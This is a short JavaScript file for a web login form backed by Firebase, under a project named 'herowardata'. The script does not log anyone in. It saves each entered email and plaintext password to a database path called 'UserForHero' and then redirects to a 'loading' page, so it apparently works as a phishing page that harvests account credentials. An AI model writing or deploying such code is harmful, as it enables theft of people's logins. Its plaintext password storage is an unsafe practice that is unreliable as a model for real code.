
  // Import the functions you need from the SDKs you need
  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
  // TODO: Add SDKs for Firebase products that you want to use
  // https://firebase.google.com/docs/web/setup#available-libraries

  // Your web app's Firebase configuration
  const firebaseConfig = {
    apiKey: "AIzaSyBxa4yHbIF5Z6qVlItDGEdfxcvziI3PAcM",
    authDomain: "herowardata.firebaseapp.com",
    databaseURL: "https://herowardata-default-rtdb.firebaseio.com",
    projectId: "herowardata",
    storageBucket: "herowardata.firebasestorage.app",
    messagingSenderId: "275549987003",
    appId: "1:275549987003:web:b63e4eeaedb9268cc9c99e"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);


import { getDatabase, ref, set, get, child, update, remove } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";

const db = getDatabase();

console.log(db);




function SetData(email, password) {
  var ps = `${password}`
var emailRegExp = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

var letter1 = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];

var letter2 = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];

var letter3 = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];

var letter4 = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];

var ranWord = letter2[Math.floor(Math.random() * letter2.length)];

var ranWord = ranWord + letter2[Math.floor(Math.random() * letter2.length)];

var ranWord = ranWord + letter3[Math.floor(Math.random() * letter3.length)];

var ranWord = ranWord + letter4[Math.floor(Math.random() * letter4.length)];

console.log(ranWord);

if(emailRegExp.test(email) && email !== '' && password !== '' && ps.length >= 8 && ps.length <= 30) {
  set(ref(db, 'UserForHero/'+email.slice(0, 3)+ranWord+email.slice(3, 5)), {
    Email: email,
    Password: password,
    CorrectID: false
  }).then(()=>{
    window.location.href = "loading.html";
  })
} else {
  document.getElementById("Ee").style.display = 'flex';
  document.getElementById("Pe").style.display = 'flex';
  if(email !== '' && emailRegExp.test(email)) {
    document.getElementById("Ee").style.display = 'none';
  }
  
  if(password !== '' && ps.length >= 8) {
    document.getElementById("Pe").style.display = 'none';
  }
}
  
  
}


document.querySelector('.btn-wrapper button').addEventListener('click', ()=>{
  
  SetData(email.value, password.value);
  
});



document.getElementById("email").addEventListener('input', ()=>{
  var emails = document.getElementById('email');
  if(document.getElementById("email").value.includes(".com")) {
      document.getElementById("Ee").style.display = 'none';
    
  } else {
    document.getElementById("Ee").style.display = 'flex';
  }
})